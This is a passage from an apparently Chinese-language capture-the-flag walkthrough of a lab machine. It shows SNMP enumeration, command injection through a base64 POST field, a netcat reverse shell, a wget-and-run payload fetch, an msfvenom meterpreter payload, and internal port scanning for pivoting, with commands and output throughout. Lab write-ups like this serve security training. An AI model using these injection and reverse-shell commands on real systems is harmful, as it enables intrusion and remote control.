“SN#NET_45JDX23”<br>End of MIB</p><hr><blockquote><p>snmpwalk -v1 -c public 10.10.10.105 1.3.6.1.2.1.47.1.1.1.1.11</p></blockquote><p>snmpwalk -c public -v 1 10.10.10.105 system</p><blockquote><p>snmpwalk -v2c -c public 10.10.10.105 .1.3.6.1.2.1.47.4.2.1.2<br>iso.3.6.1.2.1.47.4.2.1.2 = No more variables left in this MIB View (It is past the end of the MIB tree)<br>尝试获取进程列表</p></blockquote><p>用admin/NET_45JDX23，登陆后。burp抓包，发现一个post方式的远程命令执行，其中quagga，应该是用户名，此功能可能是检查某用户运行的所有进程。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-12/4.PNG" alt="4"></p><table><thead><tr><th>raw</th><th>base64</th><th>info</th></tr></thead><tbody><tr><td>quagga</td><td>cXVhZ2dh</td><td></td></tr><tr><td>root</td><td>cm9vdAo=</td><td></td></tr><tr><td>`root</td><td>whoami`</td><td>xx</td></tr><tr><td>`root</td><td>cat /etc/passwd`</td><td>cm9vdHxjYXQgL2V0Yy9wYXNzd2Q=</td></tr><tr><td>whereis nc</td><td>/bin/nc</td><td>openbsd类型的nc，没有-e选项</td></tr><tr><td>`root</td><td>/bin/nc -e /bin/bash 10.10.14.7 9900`</td><td>xx</td></tr><tr><td>`root</td><td>uname -a`</td><td>cm9vdHx1bmFtZSAtYQ==</td></tr><tr><td>`root</td><td>whereis wget`</td><td>xx</td></tr><tr><td><code>pwd</code></td><td>xx</td><td>/root</td></tr><tr><td><code>cat /root/root.txt</code></td><td>xx</td><td>can’t read root.txt</td></tr><tr><td>`root</td><td>ls -al`</td><td>xx</td></tr><tr><td>`root</td><td>wget <a href="http://10.10.14.7/payload.elf;chmod">http://10.10.14.7/payload.elf;chmod</a> +x payload.elf;./payload.elf`</td><td></td></tr></tbody></table><p><code>root|cd /root;net -e /bin/bash 10.10.14.7 2233|</code></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> --platform Linux -p linux/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp LHOST=<span class="hljs-number">10.10.14.7</span> LPORT=<span class="hljs-number">9900</span> -f elf -o payload.elf<br><br><span class="hljs-attribute">python</span> -m SimpleHTTPServer <span class="hljs-number">80</span><br><span class="hljs-attribute">root</span>|wget http://<span class="hljs-number">10.10.14.7</span>/payload.elf<br><span class="hljs-attribute">handler</span> -H <span class="hljs-number">10.10.14.7</span> -P <span class="hljs-number">9900</span> -p linux/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp<br></code></pre></div></td></tr></table></figure><h2 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h2><p>通过web rce，msf生成载荷上传运行后，获得meterpreter shell。</p><h4 id="info-enum"><a href="#info-enum" class="headerlink" title="info enum"></a>info enum</h4><figure class="highlight tcl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tcl">find . -name <span class="hljs-string">&quot;diag.php&quot;</span><br>find: &#x27;./dev/.lxd-mounts&#x27;: Permission denied<br>find: &#x27;./<span class="hljs-keyword">proc</span>/tty/driver&#x27;:<span class="hljs-title"> Permission</span> denied<span class="hljs-title"></span><br><span class="hljs-title">find:</span> &#x27;./sys/kernel/debug&#x27;:<span class="hljs-title"> Permission</span> denied<span class="hljs-title"></span><br><span class="hljs-title">find:</span> &#x27;./sys/fs/pstore&#x27;:<span class="hljs-title"> Permission</span> denied<span class="hljs-title"></span><br><span class="hljs-title">find:</span> &#x27;./sys/fs/fuse/connections/49&#x27;:<span class="hljs-title"> Permission</span> denied<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">find</span> . -name &quot;.ssh&quot;<br>/home/ubuntu/.ssh/authorized_keys  空的<br>./root/.ssh<br><br>---<span class="hljs-title"></span><br><span class="hljs-title">cd</span> /root/.ssh<span class="hljs-title"></span><br><span class="hljs-title">cat</span> authorized_keys<span class="hljs-title"></span><br><span class="hljs-title">cat</span> <span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">netstat</span> -an |<span class="hljs-title"> grep</span> 80<br>/usr/bin/python3.5 -c &#x27;import<span class="hljs-title"> pty;</span> pty.spawn(&quot;/bin/bash&quot;)&#x27;<br><br>---<span class="hljs-title"></span><br><span class="hljs-title">ping</span> -c 4 10.10.10.105<span class="hljs-title"></span><br><span class="hljs-title">traceroute</span> 10.10.10.105 命令未找到<span class="hljs-title"></span><br><span class="hljs-title">nc</span> -nvz  10.10.10.105 1-100<span class="hljs-title"></span><br><span class="hljs-title">Connection</span> to 10.10.10.105 21<span class="hljs-title"> port</span> [tcp/*]<span class="hljs-title"> succeeded!</span><br>Connection<span class="hljs-title"> to</span> 10.10.10.105 22<span class="hljs-title"> port</span> [tcp/*]<span class="hljs-title"> succeeded!</span><br><span class="hljs-title"></span><br><span class="hljs-title">ssh</span> 10.10.10.105 需要密码<br><br></code></pre></div></td></tr></table></figure><h4 id="info-1"><a href="#info-1" class="headerlink" title="info"></a>info</h4><p>通过查看/root/.ssh/authorized_keys，可知，root@web，ppacket@carrier，有两个主机。现在是<code>root@r1</code>，接下来准备渗透另外两个主机。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-12/7.PNG" alt="7"></p><p><a href="http://10.10.10.105/doc/diagram_for_tac.png">http://10.10.10.105/doc/diagram_for_tac.png</a><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-12/diagram_for_tac.png" alt="diagram_for_tac"></p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">网关ip：10.99.64.1</span><br><span class="hljs-string">目标机的ip:</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.2</span><span class="hljs-string">，10.78.10.1，10.78.11.1</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">root@r1:~#</span> <span class="hljs-string">netstat</span> <span class="hljs-string">-an</span><br><span class="hljs-string">netstat</span> <span class="hljs-string">-an</span> <span class="hljs-string">|</span> <span class="hljs-string">grep</span> <span class="hljs-number">22</span><br><span class="hljs-string">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:22</span>              <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:*</span>               <span class="hljs-string">LISTEN</span>     <br><span class="hljs-string">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.2</span><span class="hljs-string">:22</span>           <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.251</span><span class="hljs-string">:42676</span>      <span class="hljs-string">ESTABLISHED</span><br><span class="hljs-string">tcp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.2</span><span class="hljs-string">:22</span>           <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.251</span><span class="hljs-string">:48050</span>      <span class="hljs-string">ESTABLISHED</span><br><span class="hljs-string">tcp</span>        <span class="hljs-number">0</span>    <span class="hljs-number">192</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.2</span><span class="hljs-string">:51982</span>        <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.7</span><span class="hljs-string">:9900</span>         <span class="hljs-string">ESTABLISHED</span><br><span class="hljs-string">tcp</span>        <span class="hljs-number">0</span>       <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.2</span><span class="hljs-string">:22</span>           <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.251</span><span class="hljs-string">:48050</span>      <span class="hljs-string">ESTABLISHED</span><br><span class="hljs-string">发现本地IP,通过9900端口和目标机10.99.64.2,建立连接</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">nc</span> <span class="hljs-string">-nvz</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.251</span> <span class="hljs-number">1</span><span class="hljs-number">-100</span><br><span class="hljs-number">22</span><span class="hljs-string">，80</span> <span class="hljs-string">open</span><br><br><span class="hljs-string">wget</span> <span class="hljs-string">http://10.99.64.251，确认该内网ip，就是ip-10.10.10.105</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">ssh</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.251</span><br><span class="hljs-string">Permission</span> <span class="hljs-string">denied</span> <span class="hljs-string">(publickey).</span><br><span class="hljs-string">不允许登陆</span><br><span class="hljs-string">ssh</span> <span class="hljs-string">root@10.99.64.251</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">eth0网关</span><br><span class="hljs-string">ping</span> <span class="hljs-string">-c</span> <span class="hljs-number">4</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.1</span><br><span class="hljs-string">nc</span> <span class="hljs-string">-nvz</span>  <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.1</span> <span class="hljs-number">1</span><span class="hljs-number">-100</span><br><br><span class="hljs-string">Connection</span> <span class="hljs-string">to</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.1</span> <span class="hljs-number">21</span> <span class="hljs-string">port</span> [<span class="hljs-string">tcp/*</span>] <span class="hljs-string">succeeded!</span><br><span class="hljs-string">Connection</span> <span class="hljs-string">to</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.1</span> <span class="hljs-number">22</span> <span class="hljs-string">port</span> [<span class="hljs-string">tcp/*</span>] <span class="hljs-string">succeeded!</span><br><span class="hljs-string">Connection</span> <span class="hljs-string">to</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.1</span> <span class="hljs-number">53</span> <span class="hljs-string">port</span> [<span class="hljs-string">tcp/*</span>] <span class="hljs-string">succeeded!</span><br><br><span class="hljs-string">ssh</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.1</span><br><span class="hljs-string">ftp</span> <span class="hljs-number">10.99</span><span class="hljs-number">.64</span><span class="hljs-number">.1</span><span class="hljs-string">，匿名登陆成功，目录为/，无任何文件，不可写</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-string">nc</span> <span class="hljs-string">-nvz</span>  <span class="hljs-number">10.78</span><span class="hljs-number">.10</span><span class="hljs-number">.2</span> <span class="hljs-number">1</span><span class="hljs-number">-100</span> <span class="hljs-string">可能是eth1网段网关</span><br><span class="hljs-number">22</span> <span class="hljs-string">open</span><br><br><span class="hljs-string">nc</span> <span class="hljs-string">-nvz</span>  <span class="hljs-number">10.78</span><span class="hljs-number">.11</span><span class="hljs-number">.2</span> <span class="hljs-number">1</span><span class="hljs-number">-100</span> <span class="hljs-string">eth2网关</span><br><span class="hljs-number">22</span> <span class="hljs-string">open</span><br><br><span class="hljs-string">ssh</span> <span class="hljs-number">10.78</span><span class="hljs-number">.10</span><span class="hljs-number">.2</span><br><span class="hljs-string">ssh</span> <span class="hljs-number">10.78</span><span class="hljs-number">.11</span><span class="hljs-number">.2</span><br></code></pre></div></td></tr></table></figure><hr><h4 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h4><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span><br><span class="hljs-attribute">eth0</span>      Link encap:Ethernet  HWaddr <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:<span class="hljs-number">3</span>e:d<span class="hljs-number">9</span>:<span class="hljs-number">04</span>:ea  <br>          <span class="hljs-attribute">inet</span> addr:<span class="hljs-number">10.99.64.2</span>  Bcast:<span class="hljs-number">10.99.64.255</span>  Mask:<span class="hljs-number">255.255.255.0</span><br>          <span class="hljs-attribute">inet6</span> addr: fe<span class="hljs-number">80</span>::<span class="hljs-number">216</span>:<span class="hljs-number">3</span>eff:fed<span class="hljs-number">9</span>:<span class="hljs-number">4</span>ea/<span class="hljs-number">64</span> Scope:Link<br>          <span class="hljs-attribute">UP</span> BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          <span class="hljs-attribute">RX</span> packets:<span class="hljs-number">2581</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> frame:<span class="hljs-number">0</span><br>          <span class="hljs-attribute">TX</span> packets:<span class="hljs-number">1982</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> carrier:<span class="hljs-number">0</span><br>          <span class="hljs-attribute">collisions</span>:<span class="hljs-number">0</span> txqueuelen:<span class="hljs-number">1000</span> <br>          <span class="hljs-attribute">RX</span> bytes:<span class="hljs-number">3241601</span> (<span class="hljs-number">3</span>.<span class="hljs-number">2</span> MB)  TX bytes:<span class="hljs-number">295977</span> (<span class="hljs-number">295</span>.<span class="hljs-number">9</span> KB)<br><br><span class="hljs-attribute">eth1</span>      Link encap:Ethernet  HWaddr <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">8</span>a:f<span class="hljs-number">2</span>:<span class="hljs-number">4</span>f  <br>          <span class="hljs-attribute">inet</span> addr:<span class="hljs-number">10.78.10.1</span>  Bcast:<span class="hljs-number">10.78.10.255</span>  Mask:<span class="hljs-number">255.255.255.0</span><br>          <span class="hljs-attribute">inet6</span> addr: fe<span class="hljs-number">80</span>::<span class="hljs-number">216</span>:<span class="hljs-number">3</span>eff:fe<span class="hljs-number">8</span>a:f<span class="hljs-number">24</span>f/<span class="hljs-number">64</span> Scope:Link<br>          <span class="hljs-attribute">UP</span> BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          <span class="hljs-attribute">RX</span> packets:<span class="hljs-number">223</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> frame:<span class="hljs-number">0</span><br>          <span class="hljs-attribute">TX</span> packets:<span class="hljs-number">198</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> carrier:<span class="hljs-number">0</span><br>          <span class="hljs-attribute">collisions</span>:<span class="hljs-number">0</span> txqueuelen:<span class="hljs-number">1000</span> <br>          <span class="hljs-attribute">RX</span> bytes:<span class="hljs-number">16115</span> (<span class="hljs-number">16</span>.<span class="hljs-number">1</span> KB)  TX bytes:<span class="hljs-number">14695</span> (<span class="hljs-number">14</span>.<span class="hljs-number">6</span> KB)<br><br><span class="hljs-attribute">eth2</span>      Link encap:Ethernet  HWaddr <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">20</span>:<span class="hljs-number">98</span>:df  <br>          <span class="hljs-attribute">inet</span> addr:<span class="hljs-number">10.78.11.1</span>  Bcast:<span class="hljs-number">10.78.11.255</span>  Mask:<span class="hljs-number">255.255.255.0</span><br>          <span class="hljs-attribute">inet6</span> addr: fe<span class="hljs-number">80</span>::<span class="hljs-number">216</span>:<span class="hljs-number">3</span>eff:fe<span class="hljs-number">20</span>:<span class="hljs-number">98</span>df/<span class="hljs-number">64</span> Scope:Link<br>          <span class="hljs-attribute">UP</span> BROADCAST RUNNING MULTICAST  MTU:<span class="hljs-number">1500</span>  Metric:<span class="hljs-number">1</span><br>          <span class="hljs-attribute">RX</span> packets:<span class="hljs-number">231</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> frame:<span class="hljs-number">0</span><br>          <span class="hljs-attribute">TX</span> packets:<span class="hljs-number">183</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> carrier:<span class="hljs-number">0</span><br>          <span class="hljs-attribute">collisions</span>:<span class="hljs-number">0</span> txqueuelen:<span class="hljs-number">1000</span> <br>          <span class="hljs-attribute">RX</span> bytes:<span class="hljs-number">16436</span> (<span class="hljs-number">16</span>.<span class="hljs-number">4</span> KB)  TX bytes:<span class="hljs-number">13415</span> (<span class="hljs-number">13</span>.<span class="hljs-number">4</span> KB)<br><br><span class="hljs-attribute">lo</span>        Link encap:Local Loopback  <br>          <span class="hljs-attribute">inet</span> addr:<span class="hljs-number">127.0.0.1</span>  Mask:<span class="hljs-number">255.0.0.0</span><br>          <span class="hljs-attribute">inet6</span> addr: ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> Scope:Host<br>          <span class="hljs-attribute">UP</span> LOOPBACK RUNNING  MTU:<span class="hljs-number">65536</span>  Metric:<span class="hljs-number">1</span><br>          <span class="hljs-attribute">RX</span> packets:<span class="hljs-number">196</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> frame:<span class="hljs-number">0</span><br>          <span class="hljs-attribute">TX</span> packets:<span class="hljs-number">196</span> errors:<span class="hljs-number">0</span> dropped:<span class="hljs-number">0</span> overruns:<span class="hljs-number">0</span> carrier:<span class="hljs-number">0</span><br>          <span class="hljs-attribute">collisions</span>:<span class="hljs-number">0</span> txqueuelen:<span class="hljs-number">1000</span> <br>          <span class="hljs-attribute">RX</span> bytes:<span class="hljs-number">15872</span> (<span class="hljs-number">15</span>.<span class="hljs-number">8</span> KB)  TX bytes:<span class="hljs-number">15872</span> (<span class="hljs-number">15</span>.<span class="hljs-number">8</span> KB)<br></code></pre></div></td></tr></table></figure><h4 id="route"><a href="#route" class="headerlink" title="route"></a>route</h4><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Kernel</span> IP routing table<br><span class="hljs-attribute">Destination</span>     Gateway         Genmask         Flags Metric Ref    Use Iface<br><span class="hljs-attribute">default</span>         <span class="hljs-number">10.99.64.1</span>      <span class="hljs-number">0.0.0.0</span>         UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">0</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">78</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>      *               <span class="hljs-number">255.255.255.0</span>   U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">78</span>.<span class="hljs-number">11</span>.<span class="hljs-number">0</span>      *               <span class="hljs-number">255.255.255.0</span>   U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">2</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">99</span>.<span class="hljs-number">64</span>.<span class="hljs-number">0</span>      *               <span class="hljs-number">255.255.255.0</span>   U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">0</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">100</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.10.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">100</span>.<span class="hljs-number">11</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.10.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">100</span>.<span class="hljs-number">12</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.10.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">100</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.10.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">100</span>.<span class="hljs-number">14</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.10.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">100</span>.<span class="hljs-number">15</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.10.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">100</span>.<span class="hljs-number">16</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.10.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">100</span>.<span class="hljs-number">17</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.10.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">100</span>.<span class="hljs-number">18</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.10.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">100</span>.<span class="hljs-number">19</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.10.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">100</span>.<span class="hljs-number">20</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.10.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">1</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">120</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.11.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">2</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">120</span>.<span class="hljs-number">11</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.11.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">2</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">120</span>.<span class="hljs-number">12</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.11.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">2</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">120</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.11.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">2</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">120</span>.<span class="hljs-number">14</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.11.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">2</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">120</span>.<span class="hljs-number">15</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.11.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">2</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">120</span>.<span class="hljs-number">16</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.11.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">2</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">120</span>.<span class="hljs-number">17</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.11.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">2</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">120</span>.<span class="hljs-number">18</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.11.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span class="hljs-number">2</span><br><span class="hljs-attribute">10</span>.<span class="hljs-number">120</span>.<span class="hljs-number">19</span>.<span class="hljs-number">0</span>     <span class="hljs-number">10.78.11.2</span>      <span class="hljs-number">255.255.255.0</span>   UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> eth<span 